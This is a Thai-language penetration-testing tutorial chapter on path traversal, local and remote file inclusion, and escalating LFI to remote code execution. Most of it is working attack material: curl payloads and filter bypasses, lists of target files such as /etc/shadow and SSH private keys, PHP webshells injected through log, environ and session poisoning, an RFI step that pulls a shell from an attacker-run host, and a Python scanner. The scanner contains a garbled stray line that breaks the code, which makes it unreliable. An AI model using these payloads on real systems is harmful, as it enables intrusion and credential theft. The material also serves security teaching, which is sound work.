# Part 29: Directory Traversal / Path Traversal

## สารบัญ
- [29.1 Directory Traversal คืออะไร](#291-directory-traversal-คืออะไร)
- [29.2 การตรวจหาช่องโหว่](#292-การตรวจหาช่องโหว่)
- [29.3 Payloads และ Bypass](#293-payloads-และ-bypass)
- [29.4 ไฟล์เป้าหมายสำคัญ](#294-ไฟล์เป้าหมายสำคัญ)
- [29.5 LFI (Local File Inclusion)](#295-lfi-local-file-inclusion)
- [29.6 RFI (Remote File Inclusion)](#296-rfi-remote-file-inclusion)
- [29.7 LFI เป็น RCE](#297-lfi-เป็น-rce)
- [29.8 Python Path Traversal Scanner](#298-python-path-traversal-scanner)
- [29.9 แบบฝึกหัด Lab](#299-แบบฝึกหัด-lab)

---

## 29.1 Directory Traversal คืออะไร

Directory Traversal (Path Traversal) คือการใช้ ../../../ เพื่อเดินหน้าออกจาก Directory ที่ Web Server อนุญาต เข้าถึงไฟล์อื่นๆ ใน System

### ตัวอย่าง
```
URL: http://target.com/view?file=report.txt
Code: readfile('/var/www/uploads/' . $_GET['file']);

Attack:
  ?file=../../../etc/passwd

Code becomes:
  readfile('/var/www/uploads/../../../etc/passwd');
  = readfile('/etc/passwd');
```

---

## 29.2 การตรวจหาช่องโหว่

```bash
# Basic Test
curl 'http://target.com/view?file=../../../etc/passwd'

# URL Encoded
curl 'http://target.com/view?file=..%2F..%2F..%2Fetc%2Fpasswd'

# Double Encoded
curl 'http://target.com/view?file=..%252F..%252F..%252Fetc%252Fpasswd'

# Test กับพารามิเตอร์ไฟล์
curl 'http://target.com/download?filename=../../../../etc/passwd'
curl 'http://target.com/image?path=../../../etc/passwd'
curl 'http://target.com/page?doc=../../admin/config.php'
curl 'http://target.com/template?name=../../../../etc/shadow'
```

---

## 29.3 Payloads และ Bypass

```bash
# Basic
../../../etc/passwd

# URL Encoded
..%2F..%2F..%2Fetc%2Fpasswd

# Double Encoded
..%252F..%252F..%252Fetc%252Fpasswd

# Backslash (Windows)
..\..\..\windows\win.ini
..%5C..%5C..%5Cwindows%5Cwin.ini

# Null Byte (เก่า PHP)
../../../etc/passwd%00.jpg
../../../etc/passwd\0.jpg

# Unicode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd

# Strip ../ Defense Bypass
....//....//....//etc/passwd
..././../../../etc/passwd
```

---

## 29.4 ไฟล์เป้าหมายสำคัญ

```bash
# Linux Targets
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (root only)
/etc/hosts               # Hostname mapping
/etc/hostname            # Server hostname
/etc/issue               # OS version
/proc/version            # Kernel version
/proc/net/tcp            # Open TCP connections
/proc/self/cmdline       # Running process cmdline
/home/user/.ssh/id_rsa   # SSH Private Key!
/home/user/.bash_history # Command history
/var/log/apache2/access.log  # Web logs
/var/log/auth.log        # Authentication logs
/root/.ssh/id_rsa        # Root SSH Key
/etc/apache2/sites-available/000-default.conf  # Apache config
/var/www/html/config.php # Web app config

# Windows Targets
c:/windows/win.ini
c:/windows/system32/drivers/etc/hosts
c:/inetpub/wwwroot/web.config
c:/users/administrator/desktop/proof.txt  # CTF flag
c:/xampp/htdocs/index.php
```

---

## 29.5 LFI (Local File Inclusion)

### LFI vs Path Traversal
```
Path Traversal = อ่านไฟล์เต่านั้น
LFI = Include (รัน) Code จากไฟล์ที่ระบุ
```

```php
// Vulnerable Code
include($_GET['page']);

// URL: ?page=../../../etc/passwd
// Include /etc/passwd เป็น PHP Code (อ่าน Text)
// URL: ?page=../../../tmp/shell.php
// Include และ Execute shell.php!
```

### LFI Payloads
```bash
# Read /etc/passwd
curl 'http://target.com/page.php?page=../../../etc/passwd'

# PHP Wrapper - Base64 Encode Source Code
curl 'http://target.com/page.php?page=php://filter/convert.base64-encode/resource=config.php'
# Decode result:
echo 'BASE64_OUTPUT' | base64 -d

# PHP Input - Execute Code from POST
curl -X POST 'http://target.com/page.php?page=php://input' \
  -d '<?php system("id"); ?>'

# Data Wrapper
curl 'http://target.com/page.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==&cmd=id'
```

### PHP Wrappers สำคัญ
```
php://filter  - Read/Encode File Content
php://input   - Execute Code from POST Body
data://       - Execute Inline Data
zip://        - Execute from ZIP file
phar://       - Execute from PHAR file
file://       - Read Local File
```

---

## 29.6 RFI (Remote File Inclusion)

```
RFI คือการ Include ไฟล์จาก Remote URL
ต้อง allow_url_include = On ใน php.ini (ไม่ค่อยพบบ่อยแล้ว)
```

```bash
# RFI Attack
# ตั้ง HTTP Server สำหรับ Shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.txt
cd /tmp && python3 -m http.server 8080 &

# RFI
curl 'http://target.com/page.php?page=http://192.168.1.50:8080/shell.txt&cmd=id'
```

---

## 29.7 LFI เป็น RCE

### Log Poisoning
```bash
# 1. หา Log File ด้วย LFI
curl 'http://target.com/page.php?page=../../../var/log/apache2/access.log'

# 2. Poison User-Agent
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' http://target.com/
# Log จะเก็บ PHP Code!

# 3. Execute via LFI
curl 'http://target.com/page.php?page=../../../var/log/apache2/access.log&cmd=id'
```

### /proc/self/environ Poisoning
```bash
# ส่ง PHP Shell ใน User-Agent
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' http://target.com/

# Execute ผ่าน /proc/self/environ
curl 'http://target.com/page.php?page=../../../proc/self/environ&cmd=id'
```

### PHP Session Poisoning
```bash
# 1. Create Session with PHP Code
curl 'http://target.com/page.php?page=injection' \
  -H 'Cookie: PHPSESSID=evil'

# /tmp/sess_evil จะเก็บ input

# 2. Inject PHP ใน Input ที่เก็บใน Session
# 3. LFI Session File
curl 'http://target.com/page.php?page=../../../tmp/sess_evil&cmd=id'
```

---

## 29.8 Python Path Traversal Scanner

```python
#!/usr/bin/env python3
# path_traversal.py - Path Traversal Scanner

import requests
import sys
import urllib.parse

requests.packages.urllib3.disable_warnings()

PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '....//....//....//etc//passwd',
    '..//..//..//etc/passwd',
    '../../../../../../../../../../etc/passwd',
    '/etc/passwd',
]

WINDOWS_PAYLOADS = [
    '../../../windows/win.ini',
    '..\\..\\..\\windows\\win.ini',
    '..%5C..%5C..%5Cwindows%5Cwin.ini',
    '../../../../../../../../../../../../windows/win.ini',
]

TARGET_FILES = {
    'linux': {
        '/etc/passwd': 'root:x:0:0',
        '/etc/hostname': None,
        '/proc/version': 'Linux version',
    },
    'windows': {
        '/windows/win.ini': '[fonts]',
        'c:/windows/win.ini': '[fonts]',
    }
}

def test_path_traversal(url, param, os_type='linux'):
    payloads = PATH_TRAVERSAL_PAYLOADS if os_type == 'linux' else WINDOWS_PAYLOADS
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})
    session.verify = False
    
    print(f"[*] Testing Path Traversal: {url}?{param}=PAYLOAD")
    print(f"[*] OS Type: {os_type}")
    print("-" * 60)
    
    found = []
    for payload in payloads:
        try:
            resp = session.get(url, params={param: payload}, timeout=5)
            # ตรวจว่ามีข้อมูลไฟล์หรือเปล่า
root' in resp.text or 'bin/bash' in resp.text:
            if 'root:x' in resp.text or 'bin:' in resp.text or '[fonts]' in resp.text:
                print(f"  [+] VULNERABLE! Payload: {payload}")
                print(f"      Response length: {len(resp.text)}")
                print(f"      Content preview: {resp.text[:200]}")
                found.append(payload)
                break
            else:
                print(f"  [-] {payload[:50]}")
        except Exception as e:
            print(f"  [E] Error: {e}")
    
    if found:
        # LFI File Reading Test
        print("\n[+] Reading important files:")
        important = ['/etc/passwd', '/etc/hostname', '/var/www/html/config.php']
        for target_file in important:
            # สร้าง traversal path
            depth = 8
            traversal = '../' * depth + target_file.lstrip('/')
            resp = session.get(url, params={param: traversal}, timeout=5)
            if len(resp.text) > 0 and resp.status_code == 200:
                if 'root:x' in resp.text or 'hostname' in resp.text.lower():
                    print(f"  [+] Read: {target_file}")
                    print(f"      {resp.text[:100]}")
    else:
        print("  [*] No vulnerability found")
    
    return found

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <url> <param>')
        print(f'Example: {sys.argv[0]} http://target.com/view file')
        sys.exit(1)
    
    test_path_traversal(sys.argv[1], sys.argv[2])
```

---

## 29.9 แบบฝึกหัด Lab

### Lab 29-1: DVWA File Inclusion
```bash
# 1. ไปที่ DVWA: http://localhost:8080/vulnerabilities/fi/
# ?page=include.php

# 2. Path Traversal
curl 'http://localhost:8080/vulnerabilities/fi/?page=../../../etc/passwd' \
  -H 'Cookie: PHPSESSID=SESSION; security=low'

# 3. PHP Filter
curl 'http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../etc/passwd' \
  -H 'Cookie: PHPSESSID=SESSION; security=low' | base64 -d
```

### Lab 29-2: Log Poisoning
```bash
# 1. Poison log
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' \
  http://localhost:8080/

# 2. Execute via LFI
curl 'http://localhost:8080/vulnerabilities/fi/?page=../../../var/log/apache2/access.log&cmd=id' \
  -H 'Cookie: PHPSESSID=SESSION; security=low'
```

---

## สรุป

| เทคนิค | ผล | Tool |
|--------|------|------|
| Path Traversal | Read Files | curl, ffuf |
| LFI | Include/Execute | curl, Burp |
| RFI | Remote Shell | curl, nc |
| Log Poisoning | LFI → RCE | curl |
| PHP Filter | Source Code | curl |

> **จำไว้:** LFI + Log Poisoning = RCE โดยไม่ต้อง Upload File
